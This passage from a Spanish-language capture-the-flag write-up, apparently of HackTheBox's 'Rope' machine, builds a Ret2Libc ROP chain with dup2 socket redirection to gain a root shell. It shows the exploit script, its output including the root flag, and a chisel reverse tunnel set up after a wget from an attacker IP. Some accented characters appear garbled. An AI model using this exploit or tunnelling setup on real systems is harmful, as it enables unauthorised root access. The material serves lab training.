</code></pre></div><p>De nuevo, como comprobaci贸n, tenemos que verificar que la direcci贸n base de Glibc termina en <code>000</code> en hexadecimal.</p><p>El <em>offset</em> de <code>send</code> en Glibc se puede obtener manualmente como sigue (<em>offset</em> <code>0x122c30</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">libc.so.6</span> | <span class="code-dark-green">grep</span> send$
  4239: 0000000000122c30   185 FUNC    LOCAL  DEFAULT   13 __libc_<span class="code-red">send</span>  
  5010: 0000000000122c30   185 FUNC    LOCAL  DEFAULT   13 __GI___<span class="code-red">send</span>
  6755: 0000000000122c30   185 FUNC    WEAK   DEFAULT   13 <span class="code-red">send</span>
  7504: 0000000000122c30   185 FUNC    GLOBAL DEFAULT   13 __<span class="code-red">send</span>
</code></pre></div><p>En este punto, solamente queda realizar el ataque Ret2Libc, que es b谩sicamente llamar a <code>system("/bin/sh)</code> para conseguir una <em>shell</em>. Como tenemos la direcci贸n base de Glibc, podemos calcular las direcciones de <code>system</code> y <code>"/bin/sh"</code> en tiempo de ejecuci贸n usando los <em>offsets</em> correspondientes (<code>0x4f440</code> y <code>0x1b3e9a</code>, respectivamente):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">libc.so.6</span> | <span class="code-dark-green">grep</span> system$
   504: 000000000004eeb0  1200 FUNC    LOCAL  DEFAULT   13 do_<span class="code-red">system</span>
  6032: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 <span class="code-red">system</span>
  6696: 000000000004f440    45 FUNC    GLOBAL DEFAULT   13 __libc_<span class="code-red">system</span>  

<span class="code-cyan">$</span> <span class="code-dark-green">strings</span> -atx <span class="mtku">libc.so.6</span> | <span class="code-dark-green">grep</span> /bin/sh
 1b3e9a <span class="code-red">/bin/sh</span>
</code></pre></div><p>No obstante, esta t茅cnica solo funciona en un reto t铆pico de Ret2Libc. Esta vez, si usamos este procedimiento, la <em>shell</em> se abrir谩 en el lado servidor. Para poder conseguir una <em>shell</em> interactiva, tenemos que duplicar los descriptores de archivo, de manera que <code>stdin</code> (descriptor de archivo <code>0</code>), <code>stdout</code> (descriptor de archivo <code>1</code>) y <code>stderr</code> (descriptor de archivo <code>2</code>) ase copian al descriptor de archivo del <em>socket</em> (que es <code>4</code>). Esta operaci贸n se puede hacer con <code>dup2</code> de Glibc, que recibe como primer argumento el descriptor de archivo antiguo y como segundo argumento el descriptor de archivo nuevo. La idea de esto es mapear <code>4</code> -> <code>0</code>, <code>4</code> -> <code>1</code> y <code>4</code> -> <code>2</code>. Entonces, la ROP <em>chain</em> se hace un poco m谩s larga.</p><p>Este es el <em>offset</em> de <code>dup2</code> en Glibc (<code>0x1109a0</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">libc.so.6</span> | <span class="code-dark-green">grep</span> dup2$
  3623: 00000000001109a0    33 FUNC    LOCAL  DEFAULT   13 __GI___<span class="code-red">dup2</span>  
  3726: 00000000001109a0    33 FUNC    LOCAL  DEFAULT   13 __GI_<span class="code-red">dup2</span>
  5583: 00000000001109a0    33 FUNC    WEAK   DEFAULT   13 <span class="code-red">dup2</span>
  5595: 00000000001109a0    33 FUNC    GLOBAL DEFAULT   13 __<span class="code-red">dup2</span>
</code></pre></div><p>Y esta es la ROP <em>chain</em> completa para obtener una <em>shell</em> (he usado la propia Glibc para conseguir <em>gadgets</em> de ROP tambi茅n):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">rop</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ROP</span><span class="mtk1">([</span><span class="mtk8 mtku">elf</span><span class="mtk1">, </span><span class="mtk1">glibc</span><span class="mtk1">])</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">junk</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk1">canary</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk1">saved_rbp</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">fd</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> [</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">]:</span>
<span class="mtk1">        </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">rop</span><span class="mtk1">.</span><span class="mtk8">find_gadget</span><span class="mtk1">([</span><span class="mtk4">'pop rdi'</span><span class="mtk1">, </span><span class="mtk4">'ret'</span><span class="mtk1">])[</span><span class="mtk6">0</span><span class="mtk1">])</span>  
<span class="mtk1">        </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">socket_fd</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">rop</span><span class="mtk1">.</span><span class="mtk8">find_gadget</span><span class="mtk1">([</span><span class="mtk4">'pop rsi'</span><span class="mtk1">, </span><span class="mtk4">'ret'</span><span class="mtk1">])[</span><span class="mtk6">0</span><span class="mtk1">])</span>
<span class="mtk1">        </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">fd</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">symbols</span><span class="mtk1">.dup2)</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">rop</span><span class="mtk1">.</span><span class="mtk8">find_gadget</span><span class="mtk1">([</span><span class="mtk4">'pop rdi'</span><span class="mtk1">, </span><span class="mtk4">'ret'</span><span class="mtk1">])[</span><span class="mtk6">0</span><span class="mtk1">])</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk8">next</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk8">search</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh'</span><span class="mtk1">)))</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">symbols</span><span class="mtk1">.system)</span>

<span class="mtk1">    </span><span class="mtk5">with</span><span class="mtk1"> </span><span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk8">local</span><span class="mtk1">(</span><span class="mtk9 mtki">log_level</span><span class="mtk5">=</span><span class="mtk4">'CRITICAL'</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
<span class="mtk1">        </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'admin:</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>Y obtenemos una <em>shell</em> interactiva en nuestro entorno local:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">root_exploit.py</span> 127.0.0.1:1337
[<span class="code-blue">*</span>] './contact'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Canary    : 00a473852a55d816
[<span class="code-green">+</span>] Saved $rbp: 00d42e79ff7f0000
[<span class="code-green">+</span>] Saved $rip: 6265406add550000

[<span class="code-green">+</span>] ELF base address: 0x55dd6a405000

[<span class="code-blue">*</span>] Loaded 15 cached gadgets for 'contact'

[<span class="code-green">+</span>] Leaked send() address: 0x7f86cf406c30
[<span class="code-green">+</span>] Glibc base address   : 0x7f86cf2e4000

[<span class="code-blue">*</span>] Loaded 198 cached gadgets for 'libc.so.6'  

[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> whoami
rocky
<span class="code-red">$</span> ls
contact
contact_patched
fmtstr_exploit.py
httpserver
ld-linux-x86-64.so.2
libc-2.27.so
libc.so.6
root_exploit.py
</code></pre></div><p>Ya va siendo hora de lanzar el <em>exploit</em> en remoto.</p><h3 id="reenv铆o-de-puertos">Reenv铆o de puertos</h3><p>Como el binario est谩 corriendo localmente en <code>127.0.0.1:1337</code>, tendremos que usar un reenv铆o de puertos. Esto se puede realizar con <a href="https://github.com/jpillora/chisel"><code>chisel</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">r4j@rope:/tmp$ wget -q 10.10.17.44/chisel
r4j@rope:/tmp$ chmod +x chisel
r4j@rope:/tmp$ ./chisel client 10.10.17.44:1234 R:31337:127.0.0.1:1337  
client: Connecting to ws://10.10.17.44:1234
client: Connected (Latency 32.402246ms)
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./chisel</span> server -p 1234 --reverse
server: Reverse tunnelling enabled
server: Fingerprint FLlc9PM/TqWSYH1qDJuLl55hSejclXF+Nik/RhshHrc=  
server: Listening on http://0.0.0.0:1234
server: session#1: tun: proxy#R:31337=&gt;1337: Listening
</code></pre></div><p>Despu茅s de algunos minutos de fuerza bruta, finalmente obtendremos una <em>shell</em> como <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">root_exploit.py</span> 127.0.0.1:31337
[<span class="code-blue">*</span>] './contact'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Canary    : 00fbee3a3e3cc553
[<span class="code-green">+</span>] Saved $rbp: 503afae5fc7f0000
[<span class="code-green">+</span>] Saved $rip: 62750eaf8e550000

[<span class="code-green">+</span>] ELF base address: 0x558eaf0e6000

[<span class="code-blue">*</span>] Loaded 15 cached gadgets for 'contact'

[<span class="code-green">+</span>] Leaked send() address: 0x7f0645e13c30
[<span class="code-green">+</span>] Glibc base address   : 0x7f0645cf1000

[<span class="code-blue">*</span>] Loaded 198 cached gadgets for 'libc.so.6'  

[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> whoami
root
<span class="code-red">$</span> cat /root/root.txt
9d184e53053f4678beb271e733de867e
</code></pre></div><p>El <em>exploit</em> completo se puede encontrar aqu铆: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Rope/root_exploit.py"><code>root_exploit.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeraci贸n">Enumeraci贸n</a></li><li><a href="#acceso-a-la-m谩quina">Acceso a la m谩quina</a><ul><li><a href="#explotaci贸n-de-_directory-path-traversal_">Explotaci贸n de <em>Directory Path Traversal</em></a></li><li><a href="#analizando-el-binario-httpserver">Analizando el binario <code>httpserver</code></a></li><li><a href="#preparaci贸n-del-_exploit_">Preparaci贸n del <em>exploit</em></a></li><li><a href="#explotaci贸n-de-_format-string_">Explotaci贸n de <em>Format String</em></a></li><li><a href="#obteniento-rce">Obteniento RCE</a></li></ul></li><li><a href="#movimiento-lateral-al-usuario-r4j">Movimiento lateral al usuario <code>r4j</code></a><ul><li><a href="#ataque-de-_library-hijacking_">Ataque de <em>Library Hijacking</em></a></li></ul></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#analizando-el-binario-contact">Analizando el binario <code>contact</code></a></li><li><a href="#explotaci贸n-de-_buffer-overflow_">Explotaci贸n de <em>Buffer Overflow</em></a></li><li><a href="#obteniendo-fugas-de-memoria">Obteniendo fugas de memoria</a></li><li><a href="#ataque-ret2libc">Ataque Ret2Libc</a></li><li><a href="#reenv铆o-de-puertos">Reenv铆o de puertos</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0"> <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit="return window.open(&#34;https://tinyletter.com/7Rocky&#34;,&#34;popupwindow&#34;,&#34;scrollbars=yes,width=800,height=600&#34;),!0"><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electr贸nico" name="email" id="tlemail"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="tiniletter">TinyLetter</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky 2022</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedInOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHubOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>